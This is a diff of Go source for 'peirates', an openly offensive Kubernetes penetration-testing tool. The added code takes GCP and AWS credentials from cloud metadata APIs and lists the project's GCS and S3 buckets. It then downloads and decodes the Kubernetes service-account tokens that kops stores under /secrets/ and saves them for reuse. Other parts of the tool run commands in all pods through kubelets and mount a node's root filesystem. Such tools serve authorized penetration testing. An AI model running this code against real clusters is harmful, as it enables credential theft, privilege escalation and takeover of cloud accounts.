@@ -8,6 +8,7 @@ package peirates
 //
 
 import (
+	"bufio"
 	"bytes"
 	"crypto/tls"
 	"encoding/base64"
@@ -29,16 +30,13 @@ import (
 	"os/exec"  // for exec
 	"regexp"
 	"time" // Time modules
+
+	"github.com/aws/aws-sdk-go/aws"
+	"github.com/aws/aws-sdk-go/service/s3"
 	// kubernetes client
 )
 
 var UseAuthCanI bool = true
-
-// AWS credentials currently in use.
-var awsCredentials AWSCredentials
-
-// Make room for an assumed role.
-var assumedAWSrole AWSCredentials
 
 // getPodList returns an array of running pod names, parsed from "kubectl -n namespace get pods"
 func getPodList(connectionString ServerInfo) []string {
@@ -122,11 +120,37 @@ func getSecretList(connectionString ServerInfo) ([]string, []string) {
 	return secrets, serviceAccountTokens
 }
 
+// GetGCPBearerTokenFromMetadataAPI takes the name of a GCP service account and returns a token
+func GetGCPBearerTokenFromMetadataAPI(account string) string {
+
+	headers := []HeaderLine{
+		HeaderLine{"Metadata-Flavor", "Google"},
+	}
+	urlSvcAccount := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" + account + "/token"
+
+	reqTokenRaw := GetRequest(urlSvcAccount, headers, false)
+	if (reqTokenRaw == "") || (strings.HasPrefix(reqTokenRaw, "ERROR:")) {
+		println("[-] Error - could not perform request ", urlSvcAccount)
+		return ("ERROR")
+	}
+	// Body will look like this, unless error has occurred: {"access_token":"xxxxxxx","expires_in":2511,"token_type":"Bearer"}
+	// TODO: Add a check for a 200 status code
+	// Split the body on "" 's for now
+	// TODO: Parse this as JSON
+	tokenElements := strings.Split(string(reqTokenRaw), "\"")
+	if tokenElements[1] == "access_token" {
+		return (tokenElements[3])
+	} else {
+		println("[-] Error - could not find token in returned body text: ", string(reqTokenRaw))
+		return "ERROR"
+	}
+}
+
 // SwitchNamespace switches the current ServerInfo.Namespace to one entered by the user.
 func SwitchNamespace(connectionString *ServerInfo, namespacesList []string) bool {
 
 	println("\nEnter namespace to switch to or hit enter to maintain current namespace: ")
-	input, _ := ReadLineStripWhitespace()
+	input, _ := readLineStripWhitespace()
 
 	if input != "" {
 		// Make sure input is in the existing namespace list.
@@ -147,20 +171,39 @@ func SwitchNamespace(connectionString *ServerInfo, namespacesList []string) bool
 	return true
 }
 
+func readLineStripWhitespace() (string, error) {
+	line, err := readLine()
+
+	return strings.TrimSpace(line), err
+
+}
+
+// readLine reads up through the next \n from stdin. The returned string does
+// not include the \n.
+func readLine() (string, error) {
+	reader := bufio.NewReader(os.Stdin)
+	line, err := reader.ReadString('\n')
+	if err != nil {
+		return "", err
+	}
+	return line[:len(line)-1], err
+}
+
+// canCreatePods() runs kubectl to check if current token can create a pod
 // inAPod() attempts to determine if we are running in a pod.
 // Long-term, this will likely go away
-// func inAPod(connectionString ServerInfo) bool {
+func inAPod(connectionString ServerInfo) bool {
 
-// 	if os.Getenv("KUBERNETES_SERVICE_HOST") != "" {
-// 		println("[+] You may be in a Kubernetes pod. API Server to be found at: ", os.Getenv("KUBERNETES_SERVICE_HOST"))
-// 		return true
-// 	} else {
-// 		println("[-] You may not be in a Kubernetes pod. Press ENTER to continue.")
-// 		var input string
-// 		fmt.Scanln(&input)
-// 		return false
-// 	}
-// }
+	if os.Getenv("KUBERNETES_SERVICE_HOST") != "" {
+		println("[+] You may be in a Kubernetes pod. API Server to be found at: ", os.Getenv("KUBERNETES_SERVICE_HOST"))
+		return true
+	} else {
+		println("[-] You may not be in a Kubernetes pod. Press ENTER to continue.")
+		var input string
+		fmt.Scanln(&input)
+		return false
+	}
+}
 
 // GetNamespaces returns the list of active namespaces, using kubectl get namespaces
 func GetNamespaces(connectionString ServerInfo) ([]string, error) {
@@ -208,13 +251,13 @@ func printListOfPods(connectionString ServerInfo) {
 
 }
 
-// execInAllPods() runs a command in all running pods
+// execInAllPods() runs kubeData.command in all running pods
 func execInAllPods(connectionString ServerInfo, command string) {
 	runningPods := getPodList(connectionString)
 	execInListPods(connectionString, runningPods, command)
 }
 
-// execInListPods() runs a command in all pods in the provided list
+// execInListPods() runs kubeData.command in all pods in the provided list
 func execInListPods(connectionString ServerInfo, pods []string, command string) {
 	if !kubectlAuthCanI(connectionString, "exec", "pods") {
 		println("[-] Permission Denied: your service account isn't allowed to exec commands in pods")
@@ -512,6 +555,48 @@ func clearScreen() {
 	c.Run()
 }
 
+// SERVICE ACCOUNT MANAGEMENT functions start here
+
+// ServiceAccount stores service account information.
+type ServiceAccount struct {
+	Name            string    // Service account name
+	Token           string    // Service account token
+	DiscoveryTime   time.Time // Time the service account was discovered
+	DiscoveryMethod string    // How the service account was discovered (file on disk, secrets, user input, etc.)
+}
+
+// makeNewServiceAccount creates a new service account with the provided name,
+// token, and discovery method, while setting the DiscoveryTime to time.Now()
+func makeNewServiceAccount(name, token, discoveryMethod string) ServiceAccount {
+	return ServiceAccount{
+		Name:            name,
+		Token:           token,
+		DiscoveryTime:   time.Now(),
+		DiscoveryMethod: discoveryMethod,
+	}
+}
+
+func acceptServiceAccountFromUser() ServiceAccount {
+	println("\nPlease paste in a new service account token or hit ENTER to maintain current token.")
+	serviceAccount := ServiceAccount{
+		Name:            "",
+		Token:           "",
+		DiscoveryTime:   time.Now(),
+		DiscoveryMethod: "User Input",
+	}
+	println("\nWhat do you want to name this service account?")
+	serviceAccount.Name, _ = readLineStripWhitespace()
+	println("\nPaste the service account token and hit ENTER:")
+	serviceAccount.Token, _ = readLineStripWhitespace()
+
+	return serviceAccount
+}
+
+func assignServiceAccountToConnection(account ServiceAccount, info *ServerInfo) {
+	info.TokenName = account.Name
+	info.Token = account.Token
+}
+
 func banner(connectionString ServerInfo, awsCredentials AWSCredentials, assumedAWSRole AWSCredentials) {
 
 	name, err := os.Hostname()
@@ -589,7 +674,7 @@ func GetNodesInfo(connectionString ServerInfo) {
 }
 
 // ExecuteCodeOnKubelet runs a command on every pod on every node via their Kubelets.
-func ExecuteCodeOnKubelet(connectionString ServerInfo, serviceAccounts *[]ServiceAccount) {
+func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]ServiceAccount) {
 	println("[+] Getting IP addresses for the nodes in the cluster...")
 	// BUG : This auth check isn't catching when we're not allowed to get nodes at the cluster scope
 	if !kubectlAuthCanI(connectionString, "get", "nodes") {
@@ -680,8 +765,8 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, serviceAccounts *[]Servic
 								println("[+] Got service account token for", "ns:"+podNamespace+" pod:"+podName+" container:"+containerName+":", token)
 								println("")
 								name := "Pod ns:" + podNamespace + ":" + podName
-								serviceAccount := MakeNewServiceAccount(name, token, "kubelet")
-								*serviceAccounts = append(*serviceAccounts, serviceAccount)
+								serviceAccount := makeNewServiceAccount(name, token, "kubelet")
+								*ServiceAccounts = append(*ServiceAccounts, serviceAccount)
 							}
 						}
 					}
@@ -719,14 +804,16 @@ func Main() {
 	parseOptions(&cmdOpts)
 
 	// List of current service accounts
-	serviceAccounts := []ServiceAccount{MakeNewServiceAccount(connectionString.TokenName, connectionString.Token, "Loaded at startup")}
+	serviceAccounts := []ServiceAccount{makeNewServiceAccount(connectionString.TokenName, connectionString.Token, "Loaded at startup")}
 
 	// Check environment variables - see KUBERNETES_SERVICE_HOST and KUBERNETES_SERVICE_PORT
 	// Watch the documentation on these variables for changes:
 	// https://kubernetes.io/docs/concepts/containers/container-environment-variables/
 
 	// Read AWS credentials from environment variables if present.
-	awsCredentials = PullIamCredentialsFromEnvironmentVariables()
+	awsCredentials := PullIamCredentialsFromEnvironmentVariables()
+	// Make room for an assumed role.
+	var assumedAWSrole AWSCredentials
 
 	var input int
 	for ok := true; ok; ok = (input != 2) {
@@ -798,11 +885,56 @@ Off-Menu         +
 
 		//	[0] Run a kubectl command in the current namespace, API server and service account context
 		case "0", "90", "kubectl":
-			_ = kubectl_interactive(connectionString)
+			println(`
+This function allows you to run a kubectl command, with only a few restrictions.
+
+Your command must not:
+
+- change namespace
+- specify a different service account 
+- change nameservers
+- run for longer than a few seconds (as in kubectl exec)
+
+Your command will crash this program if it is not permitted.
+
+These requirements are dynamic - watch new versions for changes.
+
+Leave off the "kubectl" part of the command.  For example:
+
+- get pods
+- get pod podname -o yaml
+- get secret secretname -o yaml
+
+`)
+
+			fmt.Printf("Please enter a kubectl command: ")
+			input, _ = readLineStripWhitespace()
+
+			arguments := strings.Fields(input)
+
+			// for _, arg := range arguments {
+			// 	println("Argument:", arg)
+			//}
+			// TODO: Create an authorization check
+			// if !kubectlAuthCanI(connectionString, "get", "secret") {
+			//	println("[-] Permission Denied: your service account isn't allowed to get secrets")
+			//	break
+			//}
+
+			// func runKubectlSimple(cfg ServerInfo, cmdArgs ...string) ([]byte, []byte, error) {
+			kubectlOutput, _, err := runKubectlSimple(connectionString, arguments...)
+			if err != nil {
+				println("[-] Could not perform action: kubectl ", input)
+				break
+			}
+			kubectlOutputLines := strings.Split(string(kubectlOutput), "\n")
+			for _, line := range kubectlOutputLines {
+				println(line)
+			}
 
 		// [1] Enter a different service account token
 		case "1", "sa-menu", "service-account-menu", "sa", "service-account":
-			println("Current primary service account: ", connectionString.TokenName)
+			println("Current primary service account: %s", connectionString.TokenName)
 			println("\n")
 			println("[1] List service accounts [list]")
 			println("[2] Switch primary service account [switch]")
@@ -869,12 +1001,12 @@ Off-Menu         +
 					println(string(serviceAccountJSON))
 				}
 			case "5", "export":
-				var newserviceAccounts []ServiceAccount
-				err := json.NewDecoder(os.Stdin).Decode(&newserviceAccounts)
+				var newServiceAccounts []ServiceAccount
+				err := json.NewDecoder(os.Stdin).Decode(&newServiceAccounts)
 				if err != nil {
 					fmt.Printf("[-] Error importing service accounts: %s\n", err.Error())
 				} else {
-					serviceAccounts = append(serviceAccounts, newserviceAccounts...)
+					serviceAccounts = append(serviceAccounts, newServiceAccounts...)
 					fmt.Printf("[+] Successfully imported service accounts\n")
 				}
 			}
@@ -995,7 +1127,7 @@ Off-Menu         +
 				println("[-] ERROR: couldn't decode")
 			} else {
 				fmt.Printf("[+] Saved %s // %s\n", secretName, token)
-				serviceAccounts = append(serviceAccounts, MakeNewServiceAccount(secretName, string(token), "Cluster Secret"))
+				serviceAccounts = append(serviceAccounts, makeNewServiceAccount(secretName, string(token), "Cluster Secret"))
 			}
 
 		// [5] Check all pods for volume mounts
@@ -1034,6 +1166,7 @@ Off-Menu         +
 			fmt.Scanln(&ip)
 			println("Port:")
 			fmt.Scanln(&port)
+			// TODO: Rename/refactor MountRootFS so we get more capabilities in case the node does not run cron
 			MountRootFS(allPods, connectionString, ip, port)
 
 		// [12] Request IAM credentials from AWS Metadata API [AWS only]
@@ -1052,7 +1185,6 @@ Off-Menu         +
 		// [13] Request IAM credentials from GCP Metadata API [GCP only]
 		case "13", "get-gcp-token":
 
-			// TODO: Store the GCP token and display, to bring this inline with the GCP functionality.
 			// Make a request for our service account(s)
 			var headers []HeaderLine
 			headers = []HeaderLine{
@@ -1096,21 +1228,225 @@ Off-Menu         +
 
 		// [15] Pull Kubernetes service account tokens from Kop's bucket in GCS [GCP only]
 		case "15", "attack-kops-gcs-1":
-			serviceAccountsReturned, err := KopsAttackGCP()
-			if err != nil {
-				//Append serice accounts to the existing store
-				for _, svcacct := range serviceAccountsReturned {
-					serviceAccounts = append(serviceAccounts, svcacct)
+			var storeTokens string
+			var placeTokensInStore bool
+
+			println("[1] Store all tokens found in Peirates data store")
+			println("[2] Retrieve all tokens - I will copy and paste")
+			fmt.Scanln(&storeTokens)
+			storeTokens = strings.TrimSpace(storeTokens)
+
+			if storeTokens == "1" {
+				placeTokensInStore = true
+			}
+
+			token := GetGCPBearerTokenFromMetadataAPI("default")
+			if token == "ERROR" {
+				println("[-] Could not get GCP default token from metadata API")
+				break
+			} else {
+				println("[+] Got default token for GCP - preparing to use it for GCS:", token)
+			}
+
+			// Need to get project ID from metadata API
+			var headers []HeaderLine
+			headers = []HeaderLine{
+				HeaderLine{"Metadata-Flavor", "Google"},
+			}
+			projectID := GetRequest("http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id", headers, false)
+			if (projectID == "") || (strings.HasPrefix(projectID, "ERROR:")) {
+				break
+			}
+			println("[+] Got numberic project ID", projectID)
+
+			// Get a list of buckets, maintaining the same header and adding two lines
+			headers = []HeaderLine{
+				HeaderLine{"Authorization", "Bearer " + token},
+				HeaderLine{"Accept", "json"},
+				HeaderLine{"Metadata-Flavor", "Google"}}
+
+			// curl -s -H 'Metadata-Flavor: Google' -H "Authorization: Bearer $(cat bearertoken)" -H "Accept: json" https://www.googleapis.com/storage/v1/b/?project=$(cat projectid)
+			urlListBuckets := "https://www.googleapis.com/storage/v1/b/?project=" + projectID
+			bucketListRaw := GetRequest(urlListBuckets, headers, false)
+			if (bucketListRaw == "") || (strings.HasPrefix(bucketListRaw, "ERROR:")) {
+				break
+			}
+			bucketListLines := strings.Split(string(bucketListRaw), "\n")
+
+			// Build our list of bucket URLs
+			var bucketUrls []string
+			for _, line := range bucketListLines {
+				if strings.Contains(line, "selfLink") {
+					url := strings.Split(line, "\"")[3]
+					bucketUrls = append(bucketUrls, url)
 				}
 			}
 
+			// In every bucket URL, look at the objects
+			// Each bucket has a self-link line.  For each one, run that self-link line with /o appended to get an object list.
+			// We use the same headers[] from the previous GET request.
+		eachbucket:
+			for _, line := range bucketUrls {
+				println("Checking bucket for credentials:", line)
+				urlListObjects := line + "/o"
+				bodyListObjects := GetRequest(urlListObjects, headers, false)
+				if (bodyListObjects == "") || (strings.HasPrefix(bodyListObjects, "ERROR:")) {
+					continue
+				}
+				objectListLines := strings.Split(string(bodyListObjects), "\n")
+
+				// Run through the object data, finding selfLink lines with URL-encoded /secrets/ in them.
+				for _, line := range objectListLines {
+					if strings.Contains(line, "selfLink") {
+						if strings.Contains(line, "%2Fsecrets%2F") {
+							objectURL := strings.Split(line, "\"")[3]
+							// Find the substring that tells us this service account token's name
+							start := strings.LastIndex(objectURL, "%2F") + 3
+							serviceAccountName := objectURL[start:]
+							println("\n[+] Getting service account for:", serviceAccountName)
+
+							// Get the contents of the bucket to get the service account token
+							saTokenURL := objectURL + "?alt=media"
+
+							// We use the same headers[] from the previous GET request.
+							bodyToken := GetRequest(saTokenURL, headers, false)
+							if (bodyToken == "") || (strings.HasPrefix(bodyToken, "ERROR:")) {
+								continue eachbucket
+							}
+							tokenLines := strings.Split(string(bodyToken), "\n")
+							// TODO: Do we need to check status code?  if respToken.StatusCode != 200 {
+
+							for _, line := range tokenLines {
+								// Now parse this line to get the token
+								encodedToken := strings.Split(line, "\"")[3]
+								token, err := base64.StdEncoding.DecodeString(encodedToken)
+								if err != nil {
+									println("[-] Could not decode token.")
+								} else {
+									tokenString := string(token)
+									println(tokenString)
+
+									if placeTokensInStore {
+										tokenName := "GCS-acquired: " + string(serviceAccountName)
+										println("[+] Storing token as:", tokenName)
+										serviceAccount := makeNewServiceAccount(tokenName, tokenString, "GCS Bucket")
+										serviceAccounts = append(serviceAccounts, serviceAccount)
+
+									}
+								}
+
+							}
+
+						}
+					}
+				}
+			}
+
+			//
+			// Don't forget to base64 decode with base64.StdEncoding.DecodeString()
+
 		// [16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
 		case "16":
-			serviceAccountsReturned, err := KopsAttackAWS()
+			var storeTokens string
+			placeTokensInStore := false
+
+			println("[1] Store all tokens found in Peirates data store")
+			println("[2] Retrieve all tokens - I will copy and paste")
+			fmt.Scanln(&storeTokens)
+			storeTokens = strings.TrimSpace(storeTokens)
+
+			if storeTokens == "1" {
+				placeTokensInStore = true
+			}
+
+			if placeTokensInStore {
+				println("Saving tokens to store")
+			}
+
+			// Hit the metadata API only if AWS creds aren't loaded already.
+			var credentialsToUse AWSCredentials
+			if len(assumedAWSrole.AccessKeyId) > 0 {
+				credentialsToUse = assumedAWSrole
+			} else if len(awsCredentials.AccessKeyId) > 0 {
+				credentialsToUse = awsCredentials
+			} else {
+				println("Pulling AWS credentials from the metadata API.")
+				result, err := PullIamCredentialsFromAWS()
+				if err != nil {
+					println("[-] Could not get AWS credentials from metadata API.")
+					break
+				}
+				println("[+] Got AWS credentials from metadata API.")
+				awsCredentials = result
+				credentialsToUse = awsCredentials
+			}
+
+			println("[+] Preparing to use this AWS account to list and search S3 buckets: " + awsCredentials.AccessKeyId)
+
+			result, err := ListAWSBuckets(credentialsToUse)
 			if err != nil {
-				//Append serice accounts to the existing store
-				for _, svcacct := range serviceAccountsReturned {
-					serviceAccounts = append(serviceAccounts, svcacct)
+				println("Could not list buckets")
+				break
+			}
+			listOfBuckets := result
+
+			// Start a single S3 session
+			svc := StartS3Session(credentialsToUse)
+
+			// Look in every bucket for an oject that has a subdirectory called "secrets" in it.
+			for _, bucket := range listOfBuckets {
+				println("\n\n=============================================\n\n")
+				println("Listing items in bucket " + bucket)
+
+				// Get the list of items
+				resp, err := svc.ListObjectsV2(&s3.ListObjectsV2Input{Bucket: aws.String(bucket)})
+				if err != nil {
+					println("Unable to list items in bucket %q, %v", bucket, err)
+					break
+				}
+
+				for _, item := range resp.Contents {
+
+					if strings.Contains(*item.Key, "/secrets/") {
+						fmt.Println("Investigating bucket object for tokens:  " + *item.Key)
+
+						result, err := svc.GetObject(&s3.GetObjectInput{
+							Bucket: aws.String(bucket),
+							Key:    aws.String(*item.Key),
+						})
+
+						if err != nil {
+							continue
+						}
+
+						buf := new(bytes.Buffer)
+						buf.ReadFrom(result.Body)
+						jsonOutput := buf.String()
+						byteEncodedJsonOutput := []byte(jsonOutput)
+						// Unmarshall the json into Data : encodedtoken
+
+						var structuredVersion AWSS3BucketObject
+
+						json.Unmarshal(byteEncodedJsonOutput, &structuredVersion)
+						encodedToken := structuredVersion.Data
+						println("Encoded token: " + encodedToken)
+						token, err := base64.StdEncoding.DecodeString(encodedToken)
+						if err != nil {
+							println("[-] Could not decode token.")
+						} else {
+							tokenString := string(token)
+							println(tokenString)
+
+							if placeTokensInStore {
+								tokenName := "AWS-acquired: " + string(*item.Key)
+								println("[+] Storing token as:", tokenName)
+								serviceAccount := makeNewServiceAccount(tokenName, tokenString, "AWS Bucket")
+								serviceAccounts = append(serviceAccounts, serviceAccount)
+							}
+						}
+
+					}
+
 				}
 			}
 
@@ -1166,7 +1502,7 @@ Off-Menu         +
 			fmt.Scanln(&input)
 			println("[+] Please provide the command to run in the pods: ")
 
-			cmdOpts.commandToRunInPods, _ = ReadLineStripWhitespace()
+			cmdOpts.commandToRunInPods, _ = readLineStripWhitespace()
 
 			switch input {
 			case "1":
@@ -1263,7 +1599,7 @@ Off-Menu         +
 				// Request a parameter name
 
 				fmt.Println("[+] Enter a parameter or a blank line to finish entering parameters: ")
-				inputParameter, _ = ReadLineStripWhitespace()
+				inputParameter, _ = readLineStripWhitespace()
 
 				if inputParameter != "" {
 					// Request a parameter value
@@ -1286,14 +1622,14 @@ Off-Menu         +
 				// Request a header name
 
 				fmt.Println("[+] Enter a header name or a blank line if done: ")
-				input, _ = ReadLineStripWhitespace()
+				input, _ = readLineStripWhitespace()
 
 				inputHeader = strings.TrimSpace(input)
 
 				if inputHeader != "" {
 					// Request a header rhs (value)
 					fmt.Println("[+] Enter a value for " + inputHeader + ":")
-					input, _ = ReadLineStripWhitespace()
+					input, _ = readLineStripWhitespace()
 
 					// Add the header value to the list
 					var header HeaderLine
